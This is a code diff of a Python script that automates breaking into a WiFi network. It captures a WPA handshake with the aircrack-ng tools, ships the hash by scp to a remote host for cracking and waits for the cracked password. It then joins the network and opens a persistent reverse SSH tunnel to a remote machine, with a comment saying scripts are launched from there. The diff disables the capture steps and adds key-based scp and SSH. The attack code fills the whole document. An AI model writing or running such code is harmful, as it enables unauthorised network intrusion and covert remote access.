@@ -88,17 +88,18 @@ if __name__ == '__main__':
     # Setting interface in monitor mode
     interface = get_config_field('interface')
 
-    airmon: Airmon = Airmon()
-    airmon.check(kill=True)
-    monitor_interface: str = airmon.start(interface)
+    # airmon: Airmon = Airmon()
+    # airmon.check(kill=True)
+    # monitor_interface: str = airmon.start(interface)
+    monitor_interface: str = 'wlan0mon'
 
     # Capturing packets with airodump-ng
-    airodump: Airodump = Airodump()
+    # airodump: Airodump = Airodump()
 
     # Exporting csv file to get all networks
     output_file_name = 'networks'
-    args = ['--output-format csv', f'-w src/files/{output_file_name}']
-    airodump.exec(monitor_interface, args)
+    # args = ['--output-format csv', f'-w src/files/{output_file_name}']
+    # airodump.exec(monitor_interface, args)
 
     # Once airodump has stored all networks, I get the network bssid and its channel
     network_ssid = get_config_field('ssid')
@@ -109,39 +110,39 @@ if __name__ == '__main__':
     # Get 4-way-handshake
     handshake_file_name = f'{network_ssid}-handshake'
     args = [f'-c {channel}', f'--bssid {bssid}', f'-w src/files/{handshake_file_name}', '--output-format pcap']
-    shell_command = airodump.get_str_shell_command(monitor_interface, args)
+    # shell_command = airodump.get_str_shell_command(monitor_interface, args)
     
     # Execute airodump-ng as subprocess
-    process = subprocess.Popen(shell_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # process = subprocess.Popen(shell_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    aircrack: Aircrack = Aircrack()
+    # aircrack: Aircrack = Aircrack()
     
-    found_handshake = False
-    while not found_handshake:
-        found_handshake = aircrack.check_captured_handshake(handshake_file_name)
-        time.sleep(15)
+    # found_handshake = False
+    # while not found_handshake:
+        # found_handshake = aircrack.check_captured_handshake(handshake_file_name)
+        # time.sleep(15)
         
-    process.terminate()
-    try:
-        process.wait(10)
-    except Exception:
-        process.kill()
+    # process.terminate()
+    # try:
+    #     process.wait(10)
+    # except Exception:
+    #     process.kill()
         
-    write_log(f'[+] Handshake captured')
+    # write_log(f'[+] Handshake captured')
     
     # Stop monitor mode and restart NetworkManager
-    airmon.stop(monitor_interface)
+    # airmon.stop(monitor_interface)
     
-    command = 'service NetworkManager restart'
-    output = subprocess.run(command, shell=True, capture_output=True, text=True)
-    if output.stderr:
-        write_log(f'[!] Error executing command "{command}"')
+    # command = 'service NetworkManager restart'
+    # output = subprocess.run(command, shell=True, capture_output=True, text=True)
+    # if output.stderr:
+    #     write_log(f'[!] Error executing command "{command}"')
         
     # Enable internet through SIM card
-    enable_internet()
+    # enable_internet()
     
     # Transform .cap file to hashcat format with hcxpcappngtool
-    hashcat_format_file_name = pcap_to_hashcat_format(handshake_file_name)
+    # hashcat_format_file_name = pcap_to_hashcat_format(handshake_file_name)
     
     # Once psk.hc22000 has been stored, send via scp
     method_to_send: dict = get_config_field("send_handshake")
@@ -150,8 +151,9 @@ if __name__ == '__main__':
             user = method_to_send['scp'].get('user')
             host = method_to_send['scp'].get('host')
             path = method_to_send['scp'].get('path')
+            key_path = method_to_send['scp'].get('key_path')
             
-            command = f'scp src/files/{handshake_file_name}.hc22000 {user}@{host}:{path}'
+            command = f'scp -i {key_path} src/files/{handshake_file_name}.hc22000 {user}@{host}:{path}'
             output = subprocess.run(command, shell=True, capture_output=True, text=True)
             if output.stderr:
                 write_log(f'[!] Error transfering over scp {handshake_file_name}.hc22000')
@@ -165,32 +167,32 @@ if __name__ == '__main__':
         try:
             with open('src/files/cracked_password.txt') as f:
                 cracked_password = f.read()
+                print(cracked_password)
                     
         except FileNotFoundError:
             time.sleep(120)  # wait for 2 minutes to check again
             
     # Generate wpa config file
-    command = f'wpa_passphrase {network_ssid} {cracked_password} > /etc/wpa_supplicant/{network_ssid}.conf'
-    output = subprocess.run(command, shell=True, capture_output=True, text=True)
-    if output.stderr:
-        write_log(f'[!] Error executing command "{command}"')
-        sys.exit(1)
+    command = f'wpa_passphrase {network_ssid} {cracked_password}'
+    with open(f'/tmp/{network_ssid}.conf', 'w') as f:
+        subprocess.run(command, shell=True, text=True, stdout=f)
         
     # Connect to wifi
-    command = f'wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant/{network_ssid}.conf'
-    output = subprocess.run(command, shell=True, capture_output=True, text=True)
-    if output.stderr:
-        write_log(f'[!] Error executing command "{command}"')
-        sys.exit(1)
-        
-    # Getting an IP
-    command = f'dhclient -r; dhclient wlan0'
+    command = f'wpa_supplicant -B -i wlan0 -c /tmp/{network_ssid}.conf'
     output = subprocess.run(command, shell=True, capture_output=True, text=True)
     if output.stderr:
         write_log(f'[!] Error executing command "{command}"')
         sys.exit(1)
     
+    time.sleep(30)
+    print('Conectado a la wifi')
+        
+    # Getting an IP
+    command = f'dhclient -r; dhclient wlan0'
+    output = subprocess.run(command, shell=True, text=True)
+    
     # Open reverse tunnel
+    print('[+] Starting reverse tunnel')
     reverse_tunnel_information: dict = get_config_field('reverse_ssh_tunnel')
     
     remote_user = reverse_tunnel_information.get('user')
@@ -203,7 +205,8 @@ if __name__ == '__main__':
     if reverse_tunnel_information.get('port'):
         remote_port = reverse_tunnel_information.get('port')
     
-    command = f'screen -dmS reverse_ssh_tunnel ssh -R {remote_port}:localhost:22 {remote_user}@{remote_host} -N'
+    command = f'screen -dmS reverse_ssh_tunnel ssh -i {key_path} -R {remote_port}:localhost:22 {remote_user}@{remote_host} -N'
+    subprocess.run(command, shell=True, text=True)
     
     '''
     Listo!! A partir de aqui a lanzar scripts
